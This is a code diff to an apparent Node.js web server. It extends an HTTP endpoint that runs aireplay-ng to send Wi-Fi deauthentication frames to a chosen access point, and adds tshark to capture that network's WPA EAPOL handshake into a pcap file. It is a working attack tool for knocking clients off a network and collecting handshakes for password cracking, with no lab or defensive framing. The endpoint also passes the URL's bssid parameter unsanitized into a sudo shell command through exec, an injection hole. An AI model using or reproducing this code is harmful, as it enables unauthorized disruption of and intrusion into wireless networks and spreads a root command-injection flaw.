@@ -1779,23 +1779,77 @@ app.post("/wifi/stop-capture-handshakes", (req, res) => {
     });
   });
 });
-
 app.post("/deauth/:bssid", (req, res) => {
   const { bssid } = req.params;
 
-  let cmd = `sudo aireplay-ng -0 10 -a ${bssid} wlan2`;
+  const timestamp = Date.now();
+  const pcapPath = path.join(__dirname, `capture_${timestamp}.pcap`);
+
+  let eapolCount = 0;
+
+  // 1. tshark — ловим только EAPOL конкретной сети
+  const tshark = spawn("sudo", [
+    "tshark",
+    "-i", "wlan2",
+    "-Y", `wlan.bssid == ${bssid} && eapol`,
+    "-T", "fields",
+    "-e", "frame.time_epoch",
+    "-w", pcapPath
+  ]);
+
+  tshark.stdout.on("data", () => {
+    eapolCount++;
+  });
+
+  tshark.stderr.on("data", (data) => {
+    console.log("[tshark err]", data.toString());
+  });
+
+  console.log("[tshark] started");
+
+  // 2. deauth
+  const cmd = `sudo aireplay-ng -0 5 -a ${bssid} wlan2`;
 
   exec(cmd, (error, stdout, stderr) => {
     if (error) {
+      tshark.kill("SIGINT");
       return res.status(500).json({ error: error.message });
     }
-    res.json({
-      bssid,
-      result: stdout || stderr,
-      status: "Deauth sent",
-    });
+
+    console.log("[aireplay-ng] done");
+
+    // 3. ждём пока прилетит handshake
+    setTimeout(() => {
+      tshark.kill("SIGINT");
+      console.log("[tshark] stopped");
+
+      res.json({
+        bssid,
+        status: "Deauth + capture complete",
+        pcap: pcapPath,
+        eapolPackets: eapolCount
+      });
+
+    }, 8000);
   });
 });
+
+// app.post("/deauth/:bssid", (req, res) => {
+//   const { bssid } = req.params;
+
+//   let cmd = `sudo aireplay-ng -0 5 -a ${bssid} wlan2`;
+
+//   exec(cmd, (error, stdout, stderr) => {
+//     if (error) {
+//       return res.status(500).json({ error: error.message });
+//     }
+//     res.json({
+//       bssid,
+//       result: stdout || stderr,
+//       status: "Deauth sent",
+//     });
+//   });
+// });
 
 // ==========================
 // Start server
